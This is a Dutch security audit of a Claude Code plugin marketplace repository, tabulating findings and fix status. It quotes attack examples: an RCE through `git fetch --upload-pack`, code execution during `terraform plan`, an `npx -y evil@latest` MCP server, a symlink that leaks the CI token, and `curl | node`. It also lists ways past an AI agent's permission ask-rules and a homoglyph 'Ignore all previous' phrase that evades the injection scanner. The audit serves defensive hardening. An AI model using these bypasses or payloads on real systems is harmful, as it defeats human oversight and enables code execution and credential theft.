# Analyse Claude-setup (my-claude-skills) — 2026-09-27

> Scope: `lucas4790/my-claude-skills` op branch `claude/setup-analyse-optimalisatie-1gy14n`, read-only geanalyseerd. Alle bevindingen hieronder zijn adversarieel geverifieerd (verdict *confirmed*, *partially* of *verifier-added*) of komen van de completeness-critic. Waar een fact-check een claim corrigeerde, staat hier de gecorrigeerde versie. Tests draaiden in een Linux-container (Ubuntu 24.04, Claude Code 2.1.283, Copilot CLI 1.0.88, pwsh 7.5.2, bash 3.2.57); Windows, WSL en VS Code zelf zijn niet live getest (zie bijlage).

> **Status (bijgewerkt 2026-09-29, na de fixronde `64b610a`..`4f6cd1a`):** dit document is een momentopname van 2026-09-27. Direct na de analyse kwamen op deze branch (4a747dd): VS Code + Copilot-ondersteuning (`install-copilot.{sh,ps1}`, Copilot-tak in `update-plugins`, `profiles.json`, `settings/vscode-settings.jsonc`, `settings/project-plugins.json`, `settings/user-instructions.md`, `AGENTS.md`, README-sectie), `pyright-lsp` root-`plugin.json` voor Copilot (copilot-cli-1; getest: `copilot lsp list` toont pyright), de 6 `csharp-patterns`-mapnamen (copilot-vscode-3) en compat-checks in `validate.py`. `codebase-onboarding` staat in `extras`, niet in het Copilot-standaardprofiel (critic-5).
>
> Daarna is meer opgelost. Rijen die op `4f6cd1a` opnieuw zijn gecontroleerd, beginnen in de kolom Bevinding met **Opgelost**, **Deels opgelost** (met wat nog open is) of **Nog open**, met de commit erbij. De fixronde: `64b610a` (sync- en history-scripts), `d8a1906` (permissions en docs), `b70054f` (tests, CI, yaml-hooks), `de920ea` (installers en updater), `27e0354` (Windows-installers), `fb95d7e` (validator, catalogus, evals), `4f6cd1a` (attribution guard); "docs-pass" is de documentatiecommit die daarop volgt, en "de review-fixronde" de fixes uit de codereview van die commits. Rijen zonder markering zijn na de momentopname niet opnieuw gecontroleerd: ze kunnen nog open zijn of intussen opgelost. Hun bestand:regel-verwijzingen gelden voor de geanalyseerde stand en kunnen verschoven zijn; in de gemarkeerde rijen wijzen ze naar de huidige code, of met "toen" naar de oude.

## 1. Samenvatting

**Oordeel:** een doordachte basis. Je vendort upstream via PR's met trust-tiers, het lockfile is reproduceerbaar (`sync.sh --locked` bouwt main exact na) en shellcheck is schoon. Ook de marketplace-structuur is goed: Copilot CLI en VS Code lezen hem zonder aanpassingen, en 104 van de 112 skills zijn portable. De zwakke plekken zitten in drie lagen. De **beveiligingslaag** belooft meer dan ze waarmaakt (de "read-only"-allowlist, de validator, de auto-updater). **Installeren en updaten** houdt je keuzes niet vast. En de **portfolio** past slecht bij je dagelijkse stack: veel .NET, bijna niets voor K8s/Helm/bash.

**Top-5 risico's** (stand 2026-09-27; de status per punt staat erachter)
1. De "read-only"-allowlist voert code uit: `git fetch --upload-pack=…` geeft RCE, `terraform plan` voert `data "external"` uit en `git log --output` schrijft bestanden (security-v1, critic-1, docs-2). *Deels opgelost in d8a1906 en de review-fixronde: `git fetch` alleen in exacte vormen, geen regels meer voor git diff/log/show/blame (de ingebouwde check van Claude Code dekt ze), `helm template` naar de trusted-lijst. De ask-regels voor de kubectl/helm/terraform-vlaggen zijn alleen een vangnet: een gequote vlag of `xargs` komt erlangs. `terraform plan` staat er bewust nog in, gedocumenteerd als restrisico.*
2. `validate-pr` kleurt groen terwijl de validator crasht. Upstream kan scans ontwijken via `.gitattributes -diff`, symlinks, niet-gescande hook-events of een caveman-sha-bump (sync-ci-1, sync-ci-v1, sync-ci-7, sync-ci-5, sync-ci-3). *Deels opgelost: de crash (c49ef55), `-diff` (db9b3fa) en alle hook-events (fb95d7e); symlinks en de caveman-bump staan nog open.*
3. De SessionStart-updater installeert **elke** marketplace-plugin die ontbreekt, ook subsets en plugins die je zelf verwijderde. Elke merge komt zo binnen 6 uur op elke machine (install-update-1, security-v4). *Opgelost in de920ea (`.sh` en `.ps1`): subsets en verwijderde plugins blijven zo; plugins die nieuw in de marketplace komen, installeert de updater nog wel automatisch.*
4. Vendored plugins met een vaste `version` krijgen nooit meer gesyncte content, en de caveman-sha-bump heeft geen effect (spec-1, spec-3). *Nog open.*
5. Contextkosten: alle plugins samen overschrijden het skill-listingbudget. Op 200K-modellen houdt geen enkele plugin-skill zijn description, en .NET verdringt Azure en component-documentation (portfolio-v1, spec-5).

**Top-5 kansen**
1. Zet native `autoUpdate` aan en maak plugins opt-in met `defaultEnabled:false`, via profielen in `profiles.json` (install-update-5, portfolio-3, portfolio-v3).
2. Vul de gaten voor je stack met officiële bronnen: Microsoft Learn MCP, HashiCorp Terraform-skills, Docker, Astral (uv/ruff), en gestaged KubeShark en shell-scripting (landscape-1…6).
3. Bouw een guardrail-plugin (PreToolUse voor `terraform apply`, prod-`kubectl`/`helm`) plus een statusline met kube-context en az-subscription (features-2, features-5).
4. Voeg VS Code + Copilot toe via Copilot CLI als install-engine. Eén installatie dient dan Copilot CLI én VS Code (copilot-cli-2, copilot-vscode-1).
5. Voeg `AGENTS.md` toe, plus een user-instructions-template en een project-plugins-template die Claude Code, VS Code en Copilot allemaal lezen (features-6, copilot-vscode-5, copilot-cli-7).

## 2. Huidige stand

**Inventaris (gemeten)**

| Onderdeel | Aantal | Opmerking |
|---|---|---|
| Plugins in `marketplace.json` | 23 | 22 vendored + caveman (url + sha `ed37ab1`) |
| Upstream-bronnen (`sources.json`) | 9 | high: anthropics-skills, claude-plugins-official, dotnet-skills, microsoft-agent-skills, agent-browser; low: stannard-dotnet-skills, misaka-agent-skills, mattpocock-skills, codebase-onboarding. Repo-owned: component-documentation, spec-kit, diverse `plugin.json` |
| Skills (SKILL.md) | 112 vendored + 20 caveman | 18 met `disable-model-invocation` |
| Commands / agents / workflows | 15 (+1 caveman) / 35 (+3 caveman) / 7 | workflows: 6 in code-modernization, 1 in claude-security |
| Hooks | claude-security (shell) + caveman (node, SessionStart + elke UserPromptSubmit) | |
| MCP / LSP | 1 (terraform, docker) / 2 (pyright, Roslyn C#) | |
| Tooling | `sync.sh`, `validate.py`, `gen-catalog.py`, `bump-pinned.sh`, daily `sync-upstream.yml`, `install.{sh,ps1}`, `update-plugins.{sh,ps1}` | |

**Contextkosten (alle plugins, gemeten)**
- Model-zichtbare skill- en command-descriptions: ~53K chars (~13,3K tok). Het listingbudget is 1% van het contextvenster (portfolio-1).
- `/context` op een 1M-model: Skills 9,9K tok, dus het budget is precies op. dotnet-test houdt 18 van 19 descriptions (~4K tok), terwijl alle 32 azure-skills, component-documentation en spec-kit alleen hun naam houden (portfolio-v1).
- Op een 200K-model (haiku) houdt geen enkele plugin-skill zijn description. Met `skillListingBudgetFraction: 0.04` houdt het cloud-subset er 49 van 53 (portfolio-v1).
- Runtime-waarschuwing: `Skill listing over budget: 128–138 skills, 61–67K chars > 30000 budget` (spec-5).
- Agents kosten 5.425 tok. caveman injecteert 5.805 chars per sessie en 327 chars per prompt (portfolio-7). `claude plugin details` projecteert ~25,5K tok always-on.
- In Copilot CLI is het listingbudget standaard 15.000 chars, tegenover ~57K voor een volledige installatie (copilot-cli-3).

**Sterke punten (geverifieerd)**
- `sync.sh --locked` reproduceert main exact. Automation pusht nooit naar main: er komt één PR per trust-tier, en de status wordt pas gepost nadat de PR bestaat.
- `actions/checkout` is op SHA gepind, er is geen `pull_request_target`, en shellcheck en actionlint zijn schoon (op één false positive na).
- De marketplace-schema's zijn geldig. Alle 22 `plugin.json` passeren `claude plugin validate`, en een headless load registreert 112 skills, 35 agents, 15 commands, 7 workflows en 2 LSP's.
- De permissions zijn opt-in en worden met de hand gemerged, gesplitst in read-only en trusted-repo. De installers zijn idempotent en installeren tools per gekozen plugin. De updater is throttled, draait async en logt naar een bestand.
- SKILLS.md is actueel, en README/SECURITY/SKILLS bevatten geen gebroken links.
- component-documentation heeft een sterke regel tegen verzonnen feiten en gebruikt progressive disclosure. spec-kit is compact.
- VS Code en Copilot CLI lezen `.claude-plugin/marketplace.json` direct, ook de url+sha-pin van caveman.

## 3. Bevindingen per thema

Waar meerdere dimensies hetzelfde vonden, staan de IDs samen in één rij.

### 3.1 Security & supply chain

| ID | Ernst | Bevinding | Bewijs | Aanbeveling | Effort |
|---|---|---|---|---|---|
| security-v1, docs-2 | high | **Deels opgelost in d8a1906 en de review-fixronde erna:** de wildcards voor `git diff/log/show/blame` zijn weg (de ingebouwde read-only check van Claude Code staat hun veilige vormen toe en vraagt bij `--output`, ook gequote of via `xargs`); `git fetch` en `terraform fmt -check` staan er alleen in exacte vormen in; `helm template` staat in `permissions-trusted-repo.json`; `terraform fmt -diff` en `terraform providers lock` zijn eruit. Voor de kubectl-, helm- en terraform-wildcards die blijven, zijn ask-regels (ask wint van allow) alleen een vangnet: kubectl/helm `--kubeconfig`, kubectl `--server`/`-s`/`--cache-dir`/`--profile`, helm `--kube-apiserver`/`--kube-token`/`--post-renderer`/`--output-dir` e.a., `terraform plan -out`. Open, als restrisico beschreven in README en `$comment`: ask-regels matchen de letterlijke commandotekst, dus een gequote of ge-escapete vlag (`--kube"config"`), een gecombineerde korte vlag (`-As`) of vlaggen via `xargs` komen erlangs (de exec-plugin van een kubeconfig draait, het clustertoken gaat naar een andere API-server, een bestand wordt geschreven); `terraform plan` voert de code van de configuratie uit (critic-1); reads kunnen secrets tonen; `jq *` leest elk bestand (blijft voor `az … \| jq`). Shell-redirectie is geen gat meer: Claude Code 2.1.284 vraagt zelf voordat `> file` na een toegestaan commando schrijft (getest; in `acceptEdits` alleen buiten de werkmap). De "read-only"-allowlist maakt code-executie, bestandswrites en het lezen van secrets mogelijk | toen `settings/permissions.json:14` `Bash(git fetch *)`: `git fetch --upload-pack='touch …'` maakte een bestand aan (RCE). `git log --output=` schrijft buiten de repo; `:107` `Bash(jq *)` leest elk bestand. `terraform fmt -diff`, `providers lock` en `helm template --output-dir/--post-renderer` schrijven of voeren iets uit. De README-claim (toen README:47) en `$comment` (`:2`) klopten dus niet | Verwijder de git-wildcards (de built-in read-only set dekt status/log/diff/show al) en `jq *`. Beperk `git fetch` tot exacte vormen. Pas de README en `$comment` aan | S |
| critic-1 | high | **Nog open, wel gedocumenteerd (d8a1906):** `terraform plan` en `validate` staan bewust in de lijst; README en `$comment` noemen het als randgeval. `terraform plan *` staat in de read-only lijst en voert programma's uit de checkout uit | `permissions.json:88` `Bash(terraform plan *)`, `:86` `validate *`. Repro met Terraform 1.13.3: `data "external"` schreef bij `plan` `uid=0(root)` naar `PWNED_BY_PLAN` | Verplaats `plan` en `validate` naar `permissions-trusted-repo.json`. Corrigeer `$comment` en de README | S |
| sync-ci-3 | high | **Nog open.** Een pinned-sha-bump van caveman (node-hooks op elke prompt) wordt nooit gescand, terwijl de PR-body "no hits" meldt | `bump-pinned.sh:31` wijzigt alleen `.source.sha`, en `validate.py:165,187` scant alleen `plugins/`. PR #11: `ed37ab1…→2fd153c`, 51 commits, 145 bestanden, +6502/−837 | Scan `git diff old new` van het externe repo. Zet de compare-URL en een diffstat van hooks/mcp in de PR-body, en open een aparte PR per bump | M |
| sync-ci-v1 | high | **Opgelost in db9b3fa** voor de scan: `git diff --text --no-textconv --no-ext-diff` (`validate.py:176`). De GitHub PR-diff verbergt zulke bestanden nog. Een upstream `.gitattributes` (`-diff`/`binary`) of één NUL-byte verbergt gewijzigde bestanden voor de scan én voor de GitHub PR-diff | toen `validate.py:105`: `git diff -U0`. Een binary-regel levert geen `+`-regels op. Repro: een `.gitattributes` met `* -diff` bracht 2 high hits terug naar 0 | Gebruik `git diff --text --no-ext-diff` of difflib per bestand. Flag of strip `.gitattributes`/`.gitignore` onder `plugins/` | S |
| sync-ci-5, security-v2, features-12 | high | **Deels opgelost in fb95d7e:** hook-registraties worden structureel gelezen (elke `hooks.json`, de `hooks`-key van `plugin.json` en marketplace-entries en de bestanden die hij noemt, `hooks:`-frontmatter), elk event, en elke nieuwe of gewijzigde (event, matcher, handler) is [high]. Open: MCP- en LSP-servers, monitors en `bin/`. De hook-detectie dekt 8 van de 33 hook-events en mist MCP/LSP-servers, frontmatter-hooks, monitors en `bin/` | toen `validate.py:64` regex `(SessionStart\|…\|PreCompact)`. `claude-security/hooks/hooks.json:4` gebruikt `UserPromptExpansion` al. Een `mcpServers` met `npx -y evil@latest` gaf 0 hits | Controleer structureel: parse `hooks.json`, `.mcp.json`, `.lsp.json` en de `plugin.json`-keys, diff de (event, matcher, command)-tuples en markeer ze [high] | M |
| features-2 | high | Er zijn geen guardrails voor prod-`kubectl`/`helm` of voor `terraform apply/destroy`, terwijl auto mode standaard aan staat (v2.1.283) | Settings bevatten alleen `allow`. Bash-ask/deny-rules zijn "geen security boundary" (`Bash(kubectl delete *)` matcht niet `kubectl --context aks-prd delete …`). Het prototype werkt, maar `validate.py` blokkeert het met exit 2 | Maak een repo-owned `cloud-guardrails`-plugin met een PreToolUse-hook. Zie features-v3 en features-v1 voordat je hem shipt, en voorzie de validator van een reviewed-exemption | M |
| sync-ci-7 | medium | **Deels opgelost:** `persist-credentials: false` (caea7c5), en het token gaat alleen naar de PR-stap. Open: symlinks worden niet geweigerd. Upstream-symlinks: `cp` volgt ze (zo kan het gepersisteerde checkout-token de repo in komen), en `rsync` behoudt ze zonder melding | `sync.sh:121` `cp` en `:119` `rsync -a`. Repro: `LICENSE -> ../../.git/config` leverde een bestand op met `AUTHORIZATION: basic …` | Weiger symlinks (`find -type l`), gebruik `cp -P` of `rsync --no-links`, zet `persist-credentials: false` en geef `GH_TOKEN` alleen aan de PR-stap | S |
| sync-ci-v2 | medium | **Opgelost in fb95d7e:** elke nieuwe of gewijzigde (event, matcher, handler) is een [high]-hit, ook bij een bestaand event; een tabel in de PR-body is er niet. Hook-commands die bij een al geregistreerd event worden toegevoegd, krijgen nooit een flag. Open PR #10 voegt er nu drie toe | PR #10 `hooks.json:57` nieuw `PermissionRequest`, plus twee nieuwe `PostToolUse`-commands, zonder hit | Vergelijk structureel (zie sync-ci-5) en zet een tabel in de PR-body | M |
| security-v3 | medium | De injection-scanner is te omzeilen met homoglyphs, soft hyphens, Unicode-tagtekens en varianten zoals `${HOME}` en `id_ecdsa` | Patronen in `validate.py:31-69`: `Ignоre all previous…` (Cyrillische о) gaf `[]` | Normaliseer met NFKC, strip Cf-tekens, markeer U+E0000–E007F als [high], voeg een mixed-script-check toe en breid de credential-regex uit (`.kube/config`, `.azure`) | M |
| security-v4 | medium | **Deels opgelost in de920ea:** de updater installeert niet meer alles wat ontbreekt, alleen plugins die sinds zijn vorige run nieuw in de marketplace staan. Open: die nieuwe plugins komen nog automatisch binnen, en sync-PR's draaien nog `--warn-only`. Elke gemergde sync-PR zet nieuwe plugins, hooks en servers binnen 6 uur op elke machine. De enige gate is branch protection | toen `update-plugins.sh:27-39`, nu `:97`; sync-PR's draaien `--warn-only` (`sync-upstream.yml:139`) | Laat de updater alleen bestaande plugins updaten en nieuwe alleen melden. Laat de check falen bij [high] tenzij er een override-label staat | M |
| security-v5 | medium | LSP- en MCP-servers die automatisch starten, halen zwevende artefacten op | `plugins/dotnet/.lsp.json`: `dotnet dnx roslyn-language-server --yes --prerelease`. `terraform/.mcp.json`: `hashicorp/terraform-mcp-server:0.4.0` (tag, geen digest) krijgt `TFE_TOKEN` | Pin een exacte versie en een `@sha256`-digest, bump via `bump-pinned.sh` en documenteer de token-blootstelling | S |
| docs-v1 | medium | "Read-only" betekent niet "niet-gevoelig": verschillende regels printen secrets | `terraform output *` (bij `-json`/`-raw` plaintext), `helm get *`, `kubectl get *` (secret) | Documenteer dit. Voeg een deny toe op `Bash(kubectl get secret*)` en beperk `helm get` tot manifest/notes | S |
| spec-8, critic-5 | medium | codebase-onboarding (low trust) geeft zichzelf ongerestricte `python3`/`pip`/`git`. In Copilot CLI wordt dat een session-wide approval, en het plugin staat in het voorgestelde `copilotDefault` | `codebase-onboarding/SKILL.md:8` `allowed-tools: Bash(python3:*) Bash(pip:*) Bash(git:*) Read`. De trigger is "explain this codebase" | Haal het uit `copilotDefault` en zet het in een opt-in 'docs'-profiel. Beperk de grant via een overlay tot `Bash(python3 */scripts/analyze.py *)`, en laat `validate.py` waarschuwen op brede grants | S |
| copilot-cli-v2 | medium | In Copilot CLI blijven de `allowed-tools` van een skill de hele sessie goedgekeurd, dus `/review-pr` keurt elk shell-commando goed | Copilot 1.0.88 `addApprovedRules({scope:"session"})`, ook na resume; alleen `/reset-allowed-tools` wist ze | Documenteer dit en houd `/review-pr` en `commit-push-pr` uit het default-Copilot-profiel | S |
| portfolio-v4 | medium | `caveman-init` (model-invocable) draait `curl …/main/…caveman-init.js \| node` en schrijft in de Copilot- en `AGENTS.md`-bestanden van je werkrepo | `commands/caveman-init.md` @ `ed37ab1`, geen `disable-model-invocation` | Maak caveman opt-in (portfolio-7). Voeg een deny toe op `Skill(caveman:caveman-init)` of `Bash(curl * \| node *)` | S |
| critic-3 | medium | De ruleset "Default" richt zich op geen enkele branch. SECURITY.md klopt maar ten dele | De API: ruleset 23565151 `include: []`, `rules/branches/main` → `[]`. De klassieke protection vereist wel `validate-pr` (enforcement `everyone`). Een PR-vereiste is niet verifieerbaar | Voeg `~DEFAULT_BRANCH` en `pull_request`- en status-check-rules toe, exporteer naar `.github/rulesets/main.json` en voeg een scheduled drift-check toe | S |
| features-v3 | medium | Het guard-prototype heeft bypasses en faalt open | `terraform -chdir=infra apply`, `helm --kube-context aks-prd upgrade`, `bash -c "terraform destroy"` geven geen decision | Tokenizeer, strip globale flags, unwrap `bash -c`/`env`/`sudo`, geef `ask` bij parse-fouten en voeg een bats-testtabel toe | S |
| features-v1 | medium | **Deels opgelost in caea7c5:** `settings/claude-guardrails.json` heeft `PowerShell(...)`-tweelingen van zijn ask-regels. De allowlists (`permissions*.json`) zijn nog Bash-only, dus PowerShell-commando's vragen daar gewoon. De Windows PowerShell-tool valt buiten alle guardrails en allowlists: die zijn allemaal Bash-only | tools-reference: "Match `Bash\|PowerShell`…". Geen `PowerShell(...)`-regels in `settings/` | Gebruik de matcher `Bash\|PowerShell` en voeg `PowerShell(...)`-tweelingen toe aan alle templates | S |
| sync-ci-4 | medium | **Opgelost:** `--name-only -z --no-renames` per bestand en `+`-regels na de hunk-kop (f567cf6); niet-gescande extensies in fb95d7e (elk bestand zonder NUL-byte in de eerste 8 KB telt als tekst). De diff-scan is te omzeilen via bestandsnamen met spaties of non-ASCII, een `++ `-regel, renames en niet-gescande extensies | toen `validate.py:110-113` `line.startswith("+++ b/")` en TEXT_EXT. 5 payloads gaven 0 hits | `git -c core.quotePath=false diff --no-renames --text …` of `--name-only -z` met difflib. Scan op inhoud, niet op extensie | M |
| critic-6 | low | `permissions-trusted-repo.json` is .NET/npm-gericht. Je eigen runners ontbreken, en `python -m pytest *` matcht de gangbare vormen niet | Alleen `dotnet …`, `python -m pytest/unittest`, `npm test/lint` | Bouw de lijst opnieuw op: `pytest`, `python3 -m pytest`, `uv run pytest`, `ruff check`, `terraform plan/validate/test`, `helm lint/template/unittest`, `bats`, plus PowerShell-tweelingen | S |
| sync-ci-6 | low | **Opgelost in fb95d7e:** `finditer` met een severity per match (`validate.py:127-136`). Een quote vóór een high-"phrase"-hit verlaagt die naar low, en de eerste hit maskeert latere | toen `validate.py:82-83` en `:77` `rx.search` | Gebruik `finditer` met een severity per match | S |
| sync-ci-9 | low | Workflow-hardening: write-permissions op workflow-niveau, template-injection via `${{ github.base_ref }}`, een ongepinde installer en geen timeouts | zizmor: `:10-12`, `:39`, `:44`, `:48` `curl … \| bash` | `permissions: {}` met grants per job, `BASE_REF` via env, een gepinde installer, `timeout-minutes`. De exploitability is minimaal (public repo) | S |
| sync-ci-11 | low | **Opgelost in f567cf6:** exacte ref-match en een warning bij een netwerkfout (`bump-pinned.sh:20-29`). `bump-pinned.sh` matcht refs op hun staart (kan zo `attacker/main` pinnen) en breekt de hele job af bij een netwerkfout | toen `:20` `git ls-remote "$url" "$ref"`. De repro pinde attacker/main. (Het pad `:21 warning` werkt wél) | Vraag exact `refs/heads/$ref` op en maak van een netwerkfout een warning plus `continue` | S |
| sync-ci-12 | low | Je kunt een bron niet vasthouden op een gereviewde commit: `ref` mag geen SHA zijn, en gesloten PR's komen elke dag terug | `sync.sh:62` `--branch "$ref"`, en een SHA geeft een fatal | Voeg per bron een optionele `sha`/`hold` toe via het bestaande fetch-by-SHA-pad | S |

### 3.2 Sync-pipeline & CI

| ID | Ernst | Bevinding | Bewijs | Aanbeveling | Effort |
|---|---|---|---|---|---|
| sync-ci-1 | high | **Deels opgelost:** de sync-job meldt "Validator did not finish" als de samenvattingsregel ontbreekt en de status faalt dan (c49ef55, `sync-upstream.yml:192-195`); `validate.py` meldt een mislukte gen-catalog als probleem in plaats van te crashen (f567cf6). Open: `sync.sh:162` negeert de exit code van gen-catalog nog. Een crash van de validator levert een groene `validate-pr` op sync-PR's op, en `sync.sh` negeert een fout in gen-catalog | toen `sync-upstream.yml:75` `… \| tee` (stderr niet gevangen) en `:105` `state=success`, `validate.py:223` `check=True` raised. Repro: een afgekapte `plugin.json` of een dangling symlink gaf "success" | Vang de rc expliciet af (`set +e; …; rc=$?`) en laat de check falen bij rc≠0 of als de `✓`-regel ontbreekt. Gebruik try/except in `validate.py` en laat `sync.sh` stoppen bij een gen-catalog-fout | S |
| sync-ci-2 | medium | De GITHUB_TOKEN-aanname is verouderd. Sync-PR's starten nu `validate-pr`-runs die op goedkeuring wachten, en die zouden falen als je ze goedkeurt | Workflow `:30-31` en SECURITY.md:15. docs.github.com (changelog 2026-06-11): "approval-required state". Runs #32–#60 staan op `action_required` | Pas de comment en SECURITY.md aan. Laat `validate-pr` `--warn-only` draaien voor `sync/*` van `github-actions[bot]` (via env) | M |
| sync-ci-10, spec-6 | medium | `claude plugin validate .` valideert alleen `marketplace.json` en draait nooit voor sync-PR's | `:49` draait vanuit de repo-root. Docs: "doesn't open the plugins' skill, agent… files" | Loop over `plugins/*/` met `claude plugin validate` in beide jobs, pin de CLI en neem de controles uit spec-2, -4, -7 en -9 op in `validate.py` | S |
| landscape-v1 | medium | Een nieuwe bron onboarden via een handmatige PR faalt op de verplichte check zodra de content een high hit heeft | KubeShark `examples-bad.md:221` → `validate.py --diff` exit 2 | Werk in drie stappen: een PR met alleen `sources.json`, dan de sync-PR, dan een PR voor `plugin.json` en `marketplace.json`. Of gebruik een reviewed override-label | S |
| copilot-cli-v1 | medium | **Opgelost in b617a57:** een copy-entry kan een `patch` in `patches/` noemen; `sync.sh` past hem na elke sync toe en laat de bron falen als hij niet meer past (README, "Patching vendored files"). Verschillende fixes gaan uit van een "sync overlay" die niet bestaat. Handmatige edits in vendored plugins verdwijnen bij de volgende sync | toen `sync.sh:75-77` `rsync -a --delete`; `sources.json` kende alleen `name/repo/ref/trust/copy` | Voeg per bron `patches: ["overlays/<src>/*.patch"]` toe (`git apply` na rsync, luid falen, vastgelegd in het lock en de PR-body), of meld het alleen upstream | M |
| features-9 | medium | **Deels opgelost:** `.claude/settings.json` bestaat sinds 809d05c, maar zijn SessionStart-hook installeert alleen de attribution guard, geen rsync of shellcheck. Er is geen `.claude/settings.json` in de repo, dus cloud- en web-sessies kunnen `sync.sh` niet draaien | Een cloud-sessie mist rsync, shellcheck, helm en meer: `sync.sh:39-41` gaf "error: rsync required". *Gecorrigeerd: rsync werd later tijdens de analyse geïnstalleerd; een verse sessie mist het nog steeds* | Gebruik een setup-script voor de cloud-omgeving, of een SessionStart-hook met een `CLAUDE_CODE_REMOTE`-guard. Let op: `validate.py` scant `.claude/` niet | S |
| sync-ci-8 | low | **Opgelost in 64b610a:** elke kopieerstap wordt gecontroleerd (`sync.sh:115-122`); een mislukte kopie laat de bron falen, zet zijn paden terug en houdt de oude lock-SHA, en de CI zet dan `SYNC_FAILED`. `sync.sh` is niet atomair en negeert exit codes, dus het lock kan een SHA vastleggen waarvan de content niet gekopieerd is | toen `sync.sh:9` zonder `-e`, `:76-80` zonder checks. In CI faalde de stap wel, dus er kwam geen PR | Stage de bestanden, check elk commando en update het lock alleen bij succes | M |
| sync-ci-13, docs-18 | low | **Deels opgelost:** de wees-entry is weg en een run zonder `--only`/`--trust` ruimt zulke entries op (64b610a); README en SECURITY zeggen weer dat de validator op elke PR draait (d8a1906). Open: de cross-check in `validate.py` (sources, lock, `plugins/`, marketplace). Drift tussen lock en bronnen: een wees-entry `powershell-agent-skills` die nooit wordt opgeruimd. De workflow- en sync-beschrijvingen in README en SECURITY wijken licht af | toen `UPSTREAM.lock.json:50-54` (vlak voor 64b610a `:56-60`), README:101 en SECURITY.md:21/:55 tegenover `sync-upstream.yml:7,43-47,96-100` | Prune het lock bij ongefilterde runs, laat `validate.py` sources, lock, `plugins/` en marketplace cross-checken, en corrigeer de teksten | S |
| sync-ci-14 | low | **Nog open.** `rsync --delete` met `--exclude` laat eerder gevendorde, nu uitgesloten paden staan | `sync.sh:119`. Repro: `code-review` bleef staan (commit a64e791 moest hem met de hand verwijderen) | Voeg `--delete-excluded` toe | S |
| sync-ci-15, spec-12 | low | **Opgelost in fb95d7e:** `validate.py` waarschuwt voor elke SKILL.md die een expliciete `skills`-lijst mist. Nieuwe upstream-skills in mattpocock (een expliciete `skills`-lijst) worden gevendord maar nooit geregistreerd, en de validator merkt niets | `plugins/mattpocock-skills/.claude-plugin/plugin.json:11` bevat 24 paden. Debug-log: "Loaded 0 skills from … default directory" | Laat `validate.py` waarschuwen als een SKILL.md niet in de lijst staat | S |
| sync-ci-16 | low | **Deels opgelost in b70054f:** de PR-body telt elk gewijzigd bestand (`--untracked-files=all`). Open: de dagelijkse force-push en PR's met alleen lockfile-wijzigingen. Elke dag een force-push, PR's met alleen lockfile-wijzigingen en misleidende tellingen in de PR-body | PR #11 kreeg vijf dagelijkse heads met identieke SHA's. Toen telde `:84` ingeklapte mappen | Sla de push over als de tree gelijk is, tel met `git diff --cached --name-only` en corrigeer de tekst in SECURITY | S |
| sync-ci-17 | low | `gen-catalog` escapet `\|` in descriptions niet, waardoor de tabel breekt | `gen-catalog.py:84`. Met een pipe-test kreeg de tabel een extra kolom | Escape `\|` | S |
| sync-ci-18 | low | **Opgelost in 64b610a:** een onbekende `--trust`-waarde, een `--only`-naam zonder bron of een vlag zonder waarde geeft exit 2 voordat er iets gesynct wordt (`sync.sh:25-46`). Een ongeldige `--trust`- of `--only`-waarde wordt stil geaccepteerd (exit 0) | toen `sync.sh:19-21,45-46`: `--trust hihg` → exit 0 | Valideer `--trust` en `--only` | S |
| sync-ci-19 | low | `actions/checkout` is gepind op v4.4.0 (node20), en Node20 is sinds 2026-09-23 van de runners verwijderd | `:36,:66` `11d5960…` = v4.4.0 `using: node20` | Pin op **v7.0.1** `3d3c42e5aac5ba805825da76410c181273ba90b1` (gecorrigeerd; niet v6.1.0), zet `persist-credentials: false` en voeg Dependabot toe | S |
| sync-ci-v3 | low | De diff-parsing hangt af van de git-config: `diff.noprefix` of `diff.mnemonicPrefix` brengt de scan naar 0 | Een repro met `GIT_CONFIG_COUNT` gaf `✓ 0 warnings` | Pin het formaat: `git -c diff.noprefix=false … --src-prefix=a/ --dst-prefix=b/` | S |
| copilot-cli-10, copilot-vscode-11 | low | `validate.py` controleert niets van de Agent Skills-spec of van Copilot en VS Code | `validate.py:137-146` gebruikt een regex in plaats van YAML en `:195-205` checkt alleen name/description. Hij mist de `.git`-regel voor url-sources, `fileExtensions` bij LSP, name≠folder en de parse van agent-YAML | Voeg checks op warning-niveau toe (zie §6, stap 10) en een Copilot-smoketest via `npx @github/copilot plugin …` | M |
| features-10 | low | Sync-PR's krijgen alleen een regex-scan, geen review door Claude | SECURITY.md noemt "Regexes catch the obvious". claude-code-action weigert bots zonder `allowed_bots`. *NB: de GITHUB_TOKEN-aanname is verouderd (sync-ci-2)* | Draai `claude --bare -p … --tools "Read,Grep,Glob" --permission-mode dontAsk --json-schema …` in een aparte job met `contents: read` | M |
| sync-ci-20 | info | `validate.py` vereist Python ≥ 3.10, maar de docs zeggen alleen "python3". Sparse-checkout gebruikt de verouderde non-cone-modus | `validate.py:73` `list[int] \| None`, `sync.sh:58,63` `--no-cone` | Voeg `from __future__ import annotations` toe of documenteer ≥3.10 | S |

### 3.3 Installatie & auto-update

| ID | Ernst | Bevinding | Bewijs | Aanbeveling | Effort |
|---|---|---|---|---|---|
| install-update-1, docs-1, portfolio-2 | high | **Opgelost in de920ea** (`.sh` en `.ps1`): de updater bewaart de marketplace-namen van zijn vorige run in `known-plugins` en installeert alleen plugins die daarna zijn toegevoegd; zijn eerste run legt alleen die lijst vast, en als `claude plugin list` faalt, werkt hij alleen bij. README bijgewerkt (d8a1906, docs-pass). De auto-updater installeert elke ontbrekende plugin: subset-installs en uninstalls blijven niet staan. De README belooft "plugins added since last time" | toen `update-plugins.sh:34-40`, `.ps1:39-45`; nu `update-plugins.sh:76-111`, `.ps1:101-142`. Een test met CLI 2.1.283 na een install van alleen commit-commands installeerde alle andere plugins | Houd een snapshot bij van bekende namen en de modus, of installeer niets automatisch en meld alleen nieuwe plugins. Pas README:43 aan | M |
| install-update-5, spec-15, features-11 | medium | **Nog open:** `install.sh`/`install.ps1` zetten geen native `autoUpdate` voor Claude Code (`install-copilot.*` doet dat wel voor Copilot). De eigen SessionStart-updater doet hetzelfde als Claude Code's native `autoUpdate` per marketplace | Docs plugins/loading: `extraKnownMarketplaces.<name>.autoUpdate`, standaard uit voor third-party | Zet `autoUpdate: true` en laat de hook vervallen of beperk hem tot sha-reinstall en melden (zie spec-3) | S |
| spec-3 | medium | **Nog open.** Een caveman-sha-bump heeft geen effect omdat de manifest-versie (2.7.0) wint | `marketplace.json:259-265`. Op beide SHA's staat `plugin.json` op 2.7.0, en `installed_plugins.json` houdt de oude `gitCommitSha` | Vergelijk `source.sha` met de geïnstalleerde `gitCommitSha` en herinstalleer bij een mismatch | S |
